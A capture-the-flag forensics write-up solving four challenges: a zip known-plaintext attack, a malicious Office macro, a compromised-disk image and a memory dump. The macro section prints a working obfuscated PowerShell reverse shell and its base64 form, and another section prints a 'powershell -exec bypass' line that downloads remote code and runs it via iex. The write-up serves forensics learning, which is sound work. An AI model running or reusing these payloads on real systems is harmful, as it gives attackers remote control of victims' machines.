# Solution
## Challenge 1
The challenge gives us a ZIP file to crack. Unfortunately I could not solve this during the competition but I attempted it at home. Thanks @Zack (the author) for his tip on bkcrack!

Inside the zip file, we can see multiple files. By analyzing the zip file, we find out that the zip is encrypted with ZipCrypto Store method which is vulnerable to the plaintext attack. So to crack the zip password, we can the bkcrack tool.

![image](https://github.com/warlocksmurf/ctf-writeups/assets/121353711/7ee2e702-d5e5-40c0-af4f-1421ffe77a58)

![image](https://github.com/warlocksmurf/ctf-writeups/assets/121353711/97928222-b2b5-4ac1-83a0-bb265d74cda2)

Since the host file will always have ``# Copyright (c) 1993-2009 Microsoft Corp.`` at the start of a file, we can create our own text file using this phrase to attempt plaintext attack.

![answer](https://github.com/warlocksmurf/ctf-writeups/assets/121353711/06cb42ab-7f17-4e6a-8d1f-2418a394b028)

## Challenge 2
The challenge gives us an obfuscated powershell function. After deobfuscating it, the flag seems to be cut into two.

```
Sub Document_Open()
    Set dCBkaW1pbm = CreateObject("WScript.Shell")
    pbmcgYXQgY3Jvc = "&h&t&t&p&s&:&/&/&"
    CBtYXR0ZXJucy = "&p&a&s&t&e&b&i&n&.&c&o&m&"
    4gb3ZlciB3ZSB = "&/&r&a&w&/&K&h&4&V&y&U&Y&c&"
    Replace(luY2lkZW50IG, "&", "")
    Replace(luZyB0aGF0IG, "&", "")
    Replace(VsZCBkZWNvZG, "&", "")
    Replace(N0b3JzLCBjb3, "&", "")
    Replace(BkZWZpbmVkIH, "&", "")
    Replace(4gY29tcGxleC, "&", "")
    Replace(pbmcgYXQgY3Jvc, "&", "")
    Replace(CBtYXR0ZXJucy, "&", "")
    Replace(4gb3ZlciB3ZSB, "&", "")
    dCBkaW1pbm.Exec("whoami")
    luY2lkZW50IG = "h&t&t&p&s&:/&/g&i&s&t&.&g&i&t&h&u&b&u&s&e&r&c&o&n&t&e&n&t&.&c&o&m&/z&a&c&h&w&o&n&g&0&2"
    luZyB0aGF0IG = "/5&a&8&e&7&d&3&6&5&c&6&d&9&b&6&4&9&b&1&2&b&e&3&c&8&9&0&c&8&c&b&4"
    VsZCBkZWNvZG = "/raw"
    N0b3JzLCBjb3 = "/85f79114e8cb93dca7d1ae44d5fdd81aa95d021e9"
    BkZWZpbmVkIH = "/gistfile1"
    4gY29tcGxleC = ".txt"
End Sub
```

The first URL decoded is: ``https://pastebin.com/raw/Kh4VyUYc``

![image](https://github.com/warlocksmurf/ctf-writeups/assets/121353711/ec5b0e04-7ef1-4243-b6af-52b1e7b54c0b)

The second URL decoded is an encoded text.

![image](https://github.com/warlocksmurf/ctf-writeups/assets/121353711/21563466-ebee-4340-931f-d435d09ec45a)

```
powershell.exe -exec bypass -enc aQBmACAAKAAtAG4AbwB0ACgAJgAoACQAKABbAGMAaABhAHIAXQAoADkAOQArADgANAAtADkAOQApACsAWwBjAGgAYQByAF0AKAA2ADcAKgAxADAAMQAvADYANwApACsAWwBjAGgAYQByAF0AKAAwACsAMQAxADUALQAwACkAKwBbAGMAaABhAHIAXQAoADAAKwAxADEANgAtADAAKQArAFsAYwBoAGEAcgBdACgAMQA2ACsANAA1AC0AMQA2ACkAKwBbAGMAaABhAHIAXQAoADEAMQA0ACsAOAAwAC0AMQAxADQAKQArAFsAYwBoAGEAcgBdACgAOQA2ACoAOQA3AC8AOQA2ACkAKwBbAGMAaABhAHIAXQAoADAAKwAxADEANgAtADAAKQArAFsAYwBoAGEAcgBdACgAMAArADEAMAA0AC0AMAApACkAKQAgAC0AUABhAHQAaAAgACgAJAAoACcAJAAnACsAJwBlACcAKwAnAG4AJwArACcAdgAnACsAJwA6ACcAKwAnAFUAJwArACcAUwAnACsAJwBFACcAKwAnAFIAJwArACcAUAAnACsAJwBSACcAKwAnAE8AJwArACcARgAnACsAJwBJACcAKwAnAEwAJwArACcARQAnACkAIAArACAAKABbAHMAdAByAGkAbgBnAF0AOgA6AGoAbwBpAG4AKAAnACcALAAgACgAIAAoADkAMgAsADYAOAAsADEAMAAxACwAMQAxADUALAAxADAANwAsADEAMQA2ACwAMQAxADEALAAxADEAMgAsADkAMgAsADcANwAsADEAMQA3ACwAMQAxADUALAAxADAANQAsADkAOQApACAAfAAlAHsAIAAoACAAWwBjAGgAYQByAF0AWwBpAG4AdABdACAAJABfACkAfQApACkAIAB8ACAAJQAgAHsAJABfAH0AKQApACAALQBQAGEAdABoAFQAeQBwAGUAIAAoACgAWwBzAHQAcgBpAG4AZwBdADoAOgBqAG8AaQBuACgAJwAnACwAIAAoACAAKAA3ADYALAAxADAAMQAsADkANwAsADEAMAAyACkAIAB8ACUAewAgACgAIABbAGMAaABhAHIAXQBbAGkAbgB0AF0AIAAkAF8AKQB9ACkAKQAgAHwAIAAlACAAewAkAF8AfQApACkAKQApAHsACgAJACYAIAAoACgAIgBqAEQAawBhAHYAWABmAC0AcAA5ADgATwBZAFMAaAB0AE0AZwA0AEEAMgBjAE4ANQB4AFAASQBIAGUARgAxAHoAeQBFAGwAVABuAHcAWgBtAFIAYgBMAEsAUQBHAGkAcwBKAEMAMABVAFcAbwBCAFYAZAB1AHEAcgA2ADMANwAiACkAWwAzADcALAA1ADkALAA0ADYALAAxADUALAAyADgALAA3ACwAMQA0ACwANQAzACwANAA3ACwAMQA1AF0AIAAtAGoAbwBpAG4AIAAnACcAKQAgACgAKAAnAGQAJwArACcAbwAnACsAJwBuACcAKwAnAHQAJwArACcAIAAnACsAJwBlACcAKwAnAHgAJwArACcAZQAnACsAJwBjACcAKwAnAHUAJwArACcAdAAnACsAJwBlACcAKwAnACAAJwArACcAdAAnACsAJwBoACcAKwAnAGUAJwArACcAIAAnACsAJwBzACcAKwAnAGMAJwArACcAcgAnACsAJwBpACcAKwAnAHAAJwArACcAdAAnACsAJwAuACcAKwAnAC4AJwArACcALgAnACsAJwAgACcAKwAnAGEAJwArACcAbQAnACsAJwBhACcAKwAnAHQAJwArACcAZQAnACsAJwB1ACcAKwAnAHIAJwArACcAIAAnACsAJwBtACcAKwAnAG8AJwArACcAbQAnACsAJwBlACcAKwAnAG4AJwArACcAdAAnACsAJwAuACcAKwAnAC4AJwArACcALgAnACkAKQAKAAkAcgBlAHQAdQByAG4ACgB9AAoAJABMAEgATwBTAFQAIAA9ACAAJAAoAFsAYwBoAGEAcgBdACgAMwA2ACoAMwA2AC8AMwA2ACkAKwBbAGMAaABhAHIAXQAoADcANgArADQAMAAtADcANgApACsAWwBjAGgAYQByAF0AKAAwACsANAA5AC0AMAApACsAWwBjAGgAYQByAF0AKAAyADcAKgA0ADMALwAyADcAKQArAFsAYwBoAGEAcgBdACgAMAArADQAOQAtADAAKQArAFsAYwBoAGEAcgBdACgAMgA3ACoANAAzAC8AMgA3ACkAKwBbAGMAaABhAHIAXQAoADgANgArADQAOAAtADgANgApACsAWwBjAGgAYQByAF0AKAAwACsANAA1AC0AMAApACsAWwBjAGgAYQByAF0AKAAwACsANAA5AC0AMAApACsAWwBjAGgAYQByAF0AKAAwACsANAAxAC0AMAApACsAWwBjAGgAYQByAF0AKAAwACsAOQA5AC0AMAApACsAWwBjAGgAYQByAF0AKAA5ADgAKwA5ADcALQA5ADgAKQArAFsAYwBoAGEAcgBdACgANQAyACsAMQAxADYALQA1ADIAKQArAFsAYwBoAGEAcgBdACgANwAqADEAMAAxAC8ANwApACsAWwBjAGgAYQByAF0AKAAwACsANgAyAC0AMAApACsAWwBjAGgAYQByAF0AKAAwACsANQA3AC0AMAApACsAWwBjAGgAYQByAF0AKAAwACsANQAwAC0AMAApACsAWwBjAGgAYQByAF0AKAAwACsANAA2AC0AMAApACsAWwBjAGgAYQByAF0AKAA0ADMAKgA0ADkALwA0ADMAKQArAFsAYwBoAGEAcgBdACgAMAArADUANAAtADAAKQArAFsAYwBoAGEAcgBdACgAMQAxADYAKwA1ADYALQAxADEANgApACsAWwBjAGgAYQByAF0AKAAzADcAKgA0ADYALwAzADcAKQArAFsAYwBoAGEAcgBdACgAOAA2ACoANQAwAC8AOAA2ACkAKwBbAGMAaABhAHIAXQAoADkANAAqADUAMAAvADkANAApACsAWwBjAGgAYQByAF0AKAAwACsANAA5AC0AMAApACsAWwBjAGgAYQByAF0AKAA3ADYAKwA0ADYALQA3ADYAKQArAFsAYwBoAGEAcgBdACgAMAArADQAOQAtADAAKQArAFsAYwBoAGEAcgBdACgANwA0ACsANQAyAC0ANwA0ACkAKwBbAGMAaABhAHIAXQAoADkANgAqADUANgAvADkANgApACkAOwAKACQATABQAE8AUgBUACAAPQAgACgAJAAoADQANAA0ADQAKQApADsACgAkAFQAQwBQAEMAbABpAGUAbgB0ACAAPQAgACYAIAAoAFsAcwB0AHIAaQBuAGcAXQA6ADoAagBvAGkAbgAoACcAJwAsACAAKAAgACgANwA4ACwAMQAwADEALAAxADEAOQAsADQANQAsADcAOQAsADkAOAAsADEAMAA2ACwAMQAwADEALAA5ADkALAAxADEANgApACAAfAAlAHsAIAAoACAAWwBjAGgAYQByAF0AWwBpAG4AdABdACAAJABfACkAfQApACkAIAB8ACAAJQAgAHsAJABfAH0AKQAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJABMAEgATwBTAFQALAAgACQATABQAE8AUgBUACkAOwAKACQATgBlAHQAdwBvAHIAawBTAHQAcgBlAGEAbQAgAD0AIAAkAFQAQwBQAEMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsACgAkAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACAAPQAgACYAIAAoAFsAcwB0AHIAaQBuAGcAXQA6ADoAagBvAGkAbgAoACcAJwAsACAAKAAgACgANwA4ACwAMQAwADEALAAxADEAOQAsADQANQAsADcAOQAsADkAOAAsADEAMAA2ACwAMQAwADEALAA5ADkALAAxADEANgApACAAfAAlAHsAIAAoACAAWwBjAGgAYQByAF0AWwBpAG4AdABdACAAJABfACkAfQApACkAIAB8ACAAJQAgAHsAJABfAH0AKQAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgAJABOAGUAdAB3AG8AcgBrAFMAdAByAGUAYQBtACkAOwAKACQAUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAIAA9ACAAJgAgACgAWwBzAHQAcgBpAG4AZwBdADoAOgBqAG8AaQBuACgAJwAnACwAIAAoACAAKAA3ADgALAAxADAAMQAsADEAMQA5ACwANAA1ACwANwA5ACwAOQA4ACwAMQAwADYALAAxADAAMQAsADkAOQAsADEAMQA2ACkAIAB8ACUAewAgACgAIABbAGMAaABhAHIAXQBbAGkAbgB0AF0AIAAkAF8AKQB9ACkAKQAgAHwAIAAlACAAewAkAF8AfQApACAASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAE4AZQB0AHcAbwByAGsAUwB0AHIAZQBhAG0AKQA7AAoAJABTAHQAcgBlAGEAbQBXAHIAaQB0AGUAcgAuAEEAdQB0AG8ARgBsAHUAcwBoACAAPQAgACQAdAByAHUAZQA7AAoAJABCAHUAZgBmAGUAcgAgAD0AIAAmACAAKABbAHMAdAByAGkAbgBnAF0AOgA6AGoAbwBpAG4AKAAnACcALAAgACgAIAAoADcAOAAsADEAMAAxACwAMQAxADkALAA0ADUALAA3ADkALAA5ADgALAAxADAANgAsADEAMAAxACwAOQA5ACwAMQAxADYAKQAgAHwAJQB7ACAAKAAgAFsAYwBoAGEAcgBdAFsAaQBuAHQAXQAgACQAXwApAH0AKQApACAAfAAgACUAIAB7ACQAXwB9ACkAIABTAHkAcwB0AGUAbQAuAEIAeQB0AGUAWwBdACAAJAAoACQAKAAxADAAMgA0ACkAKQA7AAoAdwBoAGkAbABlACAAKAAkAFQAQwBQAEMAbABpAGUAbgB0AC4AQwBvAG4AbgBlAGMAdABlAGQAKQAgAHsAIAB3AGgAaQBsAGUAIAAoACQATgBlAHQAdwBvAHIAawBTAHQAcgBlAGEAbQAuAEQAYQB0AGEAQQB2AGEAaQBsAGEAYgBsAGUAKQAgAHsAIAAkAFIAYQB3AEQAYQB0AGEAIAA9ACAAJABOAGUAdAB3AG8AcgBrAFMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAQgB1AGYAZgBlAHIALAAgADAALAAgACQAQgB1AGYAZgBlAHIALgBMAGUAbgBnAHQAaAApADsACgAkAGMAMgAgAD0AIAAkACgAWwBjAGgAYQByAF0AKAAyADcAKgAxADAANAAvADIANwApACsAWwBjAGgAYQByAF0AKAA2ADAAKwAxADEANgAtADYAMAApACsAWwBjAGgAYQByAF0AKAA1ADcAKgAxADEANgAvADUANwApACsAWwBjAGgAYQByAF0AKAA2ADcAKgAxADEAMgAvADYANwApACsAWwBjAGgAYQByAF0AKAAxADgAKwAxADEANQAtADEAOAApACsAWwBjAGgAYQByAF0AKAAyADgAKwA1ADgALQAyADgAKQArAFsAYwBoAGEAcgBdACgANwA2ACoANAA3AC8ANwA2ACkAKwBbAGMAaABhAHIAXQAoADUAMAAqADQANwAvADUAMAApACsAWwBjAGgAYQByAF0AKAA4ADMAKgAxADEAMgAvADgAMwApACsAWwBjAGgAYQByAF0AKAA4ADkAKgA5ADcALwA4ADkAKQArAFsAYwBoAGEAcgBdACgAMAArADEAMQA1AC0AMAApACsAWwBjAGgAYQByAF0AKAAyADMAKgAxADEANgAvADIAMwApACsAWwBjAGgAYQByAF0AKAA3ACoAMQAwADEALwA3ACkAKwBbAGMAaABhAHIAXQAoADcAOAArADkAOAAtADcAOAApACsAWwBjAGgAYQByAF0AKAA3ADYAKgAxADAANQAvADcANgApACsAWwBjAGgAYQByAF0AKAA4ADYAKwAxADEAMAAtADgANgApACsAWwBjAGgAYQByAF0AKAAwACsANAA2AC0AMAApACsAWwBjAGgAYQByAF0AKAA4ADYAKgA5ADkALwA4ADYAKQArAFsAYwBoAGEAcgBdACgANQAyACoAMQAxADEALwA1ADIAKQArAFsAYwBoAGEAcgBdACgAMQAwADAAKwAxADAAOQAtADEAMAAwACkAKwBbAGMAaABhAHIAXQAoADEAMAAqADQANwAvADEAMAApACsAWwBjAGgAYQByAF0AKAAwACsAMQAxADQALQAwACkAKwBbAGMAaABhAHIAXQAoADkANAArADkANwAtADkANAApACsAWwBjAGgAYQByAF0AKAA5ADUAKwAxADEAOQAtADkANQApACsAWwBjAGgAYQByAF0AKAAyADUAKgA0ADcALwAyADUAKQArAFsAYwBoAGEAcgBdACgAMAArADcANAAtADAAKQArAFsAYwBoAGEAcgBdACgANQA5ACoANgA3AC8ANQA5ACkAKwBbAGMAaABhAHIAXQAoADMAMQArADEAMAAzAC0AMwAxACkAKwBbAGMAaABhAHIAXQAoADAAKwA3ADYALQAwACkAKwBbAGMAaABhAHIAXQAoADUANgArADEAMgAyAC0ANQA2ACkAKwBbAGMAaABhAHIAXQAoADUANwArADUAMgAtADUANwApACsAWwBjAGgAYQByAF0AKAAwACsAMQAwADIALQAwACkAKwBbAGMAaABhAHIAXQAoADQAMAAqADQAOQAvADQAMAApACkAOwAKACQAQwBvAGQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4ACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAQgB1AGYAZgBlAHIALAAgADAALAAgACQAUgBhAHcARABhAHQAYQAgAC0AMQApACAAfQA7AAoAaQBmACAAKAAkAFQAQwBQAEMAbABpAGUAbgB0AC4AQwBvAG4AbgBlAGMAdABlAGQAIAAtAGEAbgBkACAAJABDAG8AZABlAC4ATABlAG4AZwB0AGgAIAAtAGcAdAAgADEAKQAgAHsAIAAkAE8AdQB0AHAAdQB0ACAAPQAgAHQAcgB5ACAAewAgACYAIAAoAFsAcwB0AHIAaQBuAGcAXQA6ADoAagBvAGkAbgAoACcAJwAsACAAKAAgACgANwAzACwAMQAxADAALAAxADEAOAAsADEAMQAxACwAMQAwADcALAAxADAAMQAsADQANQAsADYAOQAsADEAMgAwACwAMQAxADIALAAxADEANAAsADEAMAAxACwAMQAxADUALAAxADEANQAsADEAMAA1ACwAMQAxADEALAAxADEAMAApACAAfAAlAHsAIAAoACAAWwBjAGgAYQByAF0AWwBpAG4AdABdACAAJABfACkAfQApACkAIAB8ACAAJQAgAHsAJABfAH0AKQAgACgAJABDAG8AZABlACkAIAAyAD4AJgAxACAAfQAgAGMAYQB0AGMAaAAgAHsAIAAkAF8AIAB9ADsACgAkAFMAdAByAGUAYQBtAFcAcgBpAHQAZQByAC4AVwByAGkAdABlACgAJAAoACgAJAAoACcAJAAnACsAJwBPACcAKwAnAHUAJwArACcAdAAnACsAJwBwACcAKwAnAHUAJwArACcAdAAnACsAJwBgACcAKwAnAG4AJwApACkAKQApADsACgAkAEMAbwBkAGUAIAA9ACAAJABuAHUAbABsACAAfQAgAH0AOwAKACQAVABDAFAAQwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApADsACgAkAE4AZQB0AHcAbwByAGsAUwB0AHIAZQBhAG0ALgBDAGwAbwBzAGUAKAApADsACgAkAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByAC4AQwBsAG8AcwBlACgAKQA7AAoAJABTAHQAcgBlAGEAbQBXAHIAaQB0AGUAcgAuAEMAbABvAHMAZQAoACkAOwAKAAoA
```

![image](https://github.com/warlocksmurf/ctf-writeups/assets/121353711/2ee3d0ae-33f5-4d1e-a012-cce264a68c2c)

The decoded text was ran using Powershell and by analyzing the text, we can find a suspcious variable called `$C`. This indicates a C2 server perhaps and by running the command on Powershell the second URL is obtained: ``https://pastebin.com/raw/JCgLz4f1``.

```
if (-not(&($([char](99+84-99)+[char](67*101/67)+[char](0+115-0)+[char](0+116-0)+[char](16+45-16)+[char](114+80-114)+[char](96*97/96)+[char](0+116-0)+[char](0+104-0))) -Path ($('$'+'e'+'n'+'v'+':'+'U'+'S'+'E'+'R'+'P'+'R'+'O'+'F'+'I'+'L'+'E') + ([string]::join('', ( (92,68,101,115,107,116,111,112,92,77,117,115,105,99) |%{ ( [char][int] $_)})) | % {$_})) -PathType (([string]::join('', ( (76,101,97,102) |%{ ( [char][int] $_)})) | % {$_})))){
	& (("jDkavXf-p98OYShtMg4A2cN5xPIHeF1zyElTnwZmRbLKQGisJC0UWoBVduqr637")[37,59,46,15,28,7,14,53,47,15] -join '') (('d'+'o'+'n'+'t'+' '+'e'+'x'+'e'+'c'+'u'+'t'+'e'+' '+'t'+'h'+'e'+' '+'s'+'c'+'r'+'i'+'p'+'t'+'.'+'.'+'.'+' '+'a'+'m'+'a'+'t'+'e'+'u'+'r'+' '+'m'+'o'+'m'+'e'+'n'+'t'+'.'+'.'+'.'))
	return
}
$LHOST = $([char](36*36/36)+[char](76+40-76)+[char](0+49-0)+[char](27*43/27)+[char](0+49-0)+[char](27*43/27)+[char](86+48-86)+[char](0+45-0)+[char](0+49-0)+[char](0+41-0)+[char](0+99-0)+[char](98+97-98)+[char](52+116-52)+[char](7*101/7)+[char](0+62-0)+[char](0+57-0)+[char](0+50-0)+[char](0+46-0)+[char](43*49/43)+[char](0+54-0)+[char](116+56-116)+[char](37*46/37)+[char](86*50/86)+[char](94*50/94)+[char](0+49-0)+[char](76+46-76)+[char](0+49-0)+[char](74+52-74)+[char](96*56/96));
$LPORT = ($(4444));
$TCPClient = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) Net.Sockets.TCPClient($LHOST, $LPORT);
$NetworkStream = $TCPClient.GetStream();
$StreamReader = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) IO.StreamReader($NetworkStream);
$StreamWriter = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) IO.StreamWriter($NetworkStream);
$StreamWriter.AutoFlush = $true;
$Buffer = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) System.Byte[] $($(1024));
while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length);
$c2 = $([char](27*104/27)+[char](60+116-60)+[char](57*116/57)+[char](67*112/67)+[char](18+115-18)+[char](28+58-28)+[char](76*47/76)+[char](50*47/50)+[char](83*112/83)+[char](89*97/89)+[char](0+115-0)+[char](23*116/23)+[char](7*101/7)+[char](78+98-78)+[char](76*105/76)+[char](86+110-86)+[char](0+46-0)+[char](86*99/86)+[char](52*111/52)+[char](100+109-100)+[char](10*47/10)+[char](0+114-0)+[char](94+97-94)+[char](95+119-95)+[char](25*47/25)+[char](0+74-0)+[char](59*67/59)+[char](31+103-31)+[char](0+76-0)+[char](56+122-56)+[char](57+52-57)+[char](0+102-0)+[char](40*49/40));
$Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) };
if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { & ([string]::join('', ( (73,110,118,111,107,101,45,69,120,112,114,101,115,115,105,111,110) |%{ ( [char][int] $_)})) | % {$_}) ($Code) 2>&1 } catch { $_ };
$StreamWriter.Write($(($('$'+'O'+'u'+'t'+'p'+'u'+'t'+'`'+'n'))));
$Code = $null } };
$TCPClient.Close();
$NetworkStream.Close();
$StreamReader.Close();
$StreamWriter.Close();
```

![image](https://github.com/warlocksmurf/ctf-writeups/assets/121353711/b2ab5161-0da2-42b9-bbff-c802383c09bd)

With the two URLs, the flag can be obtained.

![image](https://github.com/warlocksmurf/ctf-writeups/assets/121353711/0c20358b-31d0-4185-a3b7-bc46c3b36fd9)

## Challenge 3
The challenge wants us to analyze a E01 file from a compromised Windows machine. Hence I will use autopsy for this challenge.

Analyzing the image, a credentials.txt file was found in the Desktop (sus...) and it shows the username and passwords of several users.

![image](https://github.com/warlocksmurf/ctf-writeups/assets/121353711/b7cc7cdd-32e9-4671-b0a5-cf5b9d7e4b1a)

When analyzing the Downloads directory, we find many files with base64 encoded filenames. We find a private.rar file and I extracted it to analyze it later. To unzip the folder, it requires a password and remember how we have the credentials.txt file? I used naruto's password and it worked!

![image](https://github.com/warlocksmurf/ctf-writeups/assets/121353711/8ad4de42-ac8a-4a09-b3a2-05ce7bc8a9b8)

![image](https://github.com/warlocksmurf/ctf-writeups/assets/121353711/d5e6aa25-a0fe-4a03-881a-d4bf5934d4c2)

It was a bunch of videos and after spending 2-3 hours analyzing them, they were useless in our search 💀. Well now I am back in a loophole so I went back to the Downloads directory. Going back to the Downloads directory, a suspicious process was found. So I extracted it to analyze it further.

![image](https://github.com/warlocksmurf/ctf-writeups/assets/121353711/87c76c03-ddc2-45b8-97e6-d560e8b787f3)

When running the file, it changed my Desktop wallpaper (Damn you Shisui!!). At this point, I was stuck in the competition, however, I read a writeup from @OctaneSan

![shishui](https://github.com/warlocksmurf/ctf-writeups/assets/121353711/a7adad5b-1831-4d21-9df0-15d94b44e4d1)

So I started analyzing it via Procmon to see what it actually does in my system other than changing the wallpaper. PS: from the file thumbnail, it seems to be a Python executable.

![image](https://github.com/warlocksmurf/ctf-writeups/assets/121353711/d0d3f321-6275-4df1-8064-5fb8eaed9a85)

Analyzing the process logs, a malicious operation that links with the registry key and shell was found. Jumping to the process, we can see a powershell command being invoked. After running the powershell script, it leads to the text file.

![image](https://github.com/warlocksmurf/ctf-writeups/assets/121353711/25d50d2d-8e88-4eb9-b640-b21ff335ee05)

![image](https://github.com/warlocksmurf/ctf-writeups/assets/121353711/f8375b78-e228-4ab2-8049-ea92938451f0)

```
powershell -exec bypass -c 'Invoke-WebRequest https://gist.githubusercontent.com/zachwong02/9f9054bc9db15aeb453dc37e59878aac/raw/48f39f9328189ae8260c6e040eb6d3b57403135e/gistfile1.txt | iex'
```

The text file sems to be obfuscated and it seems to be reading the genjutsu.jpg picture that was seen in the Downloads directory in our image. So I extracted the image and ran the command to get the flag.

```
$chars = Get-FileMetaData $env:USERPROFILE\Downloads\genjutsu.jpg | Select-Object -ExpandProperty "Title"
$chars[0] + $chars[1] + $chars[14] + $chars[7] + $chars[54] + $chars[55] + $chars[65] + $chars[41] + $chars[4] + $chars[17] + $chars[57] + $chars[62] +$chars[18] + $chars[45] + $chars[55] + $chars[13] + $chars[2] + $chars[4] +  $chars[63] +  $chars[62] + $chars[57] + $chars[63] + $chars[38] +  $chars[50] + $chars[63] + $chars[39] +  $chars[34] + $chars[39] + $chars[35] + $chars[64] + $chars[63] + $chars[48] + $chars[26] + $chars[24] + $chars[66]
```

![image](https://github.com/warlocksmurf/ctf-writeups/assets/121353711/7794d3f2-627c-46b1-b862-f18266e2afef)

## Challenge 4
For this challenge we had to perform memory forensics on a memory dump. Unfortunately I could not solve this during the competition but I attempted it at home. Thanks @Encient for her writeup!

Reading the pdf file given, it says that employees are required to backup data including documentation, images, videos, etc.

![image](https://github.com/warlocksmurf/ctf-writeups/assets/121353711/2f485a8e-578e-4d16-8a30-d32a9369f39c)

I performed the common Volatility commands like psscan and filescan with SCP as the keyword. Looks like we got a suspcious .doc file.

![image](https://github.com/warlocksmurf/ctf-writeups/assets/121353711/f474dce6-cd0a-4710-8c62-eba29aa4425a)

After extracting it, I read its contents using strings and found the location of the flag text file. However, it seems that it's missing in the memory dump.

![image](https://github.com/warlocksmurf/ctf-writeups/assets/121353711/be81f5d2-da68-4656-9d22-e19261d4671d)

![image](https://github.com/warlocksmurf/ctf-writeups/assets/121353711/dd8aeb2a-c5e2-4170-ac05-df3abbc12739)

![image](https://github.com/warlocksmurf/ctf-writeups/assets/121353711/b44eadfb-202c-4680-b810-116caaf06f75)

Referring back to the pdf file, it also mentions that employees must "eradicate" or in another words delete the data. So it seeems the flag was probably deleted and hence I should find it in the Recycle bin.

![image](https://github.com/warlocksmurf/ctf-writeups/assets/121353711/ce6568ab-8e52-44d5-aa14-98603036305e)

Since Volatility3 does not have mftparser, I could not proceed further. So I used Volatility2 on my Windows OS with mftparser plugin and parsed the MFT data into a text file.

```
vol.py -f memdump.raw --profile=Win7SP1x64 mftparser > mft.txt
```

After parsing the MFT data, we can either grep `.txt` or `$Recycle` to locate the flag file.

![image](https://github.com/warlocksmurf/localctf-writeups/assets/121353711/a3692813-24ca-49f4-9e55-775faa7c15d0)

![image](https://github.com/warlocksmurf/ctf-writeups/assets/121353711/d1f413e9-e086-47cc-819f-51cb9d4e5a6c)
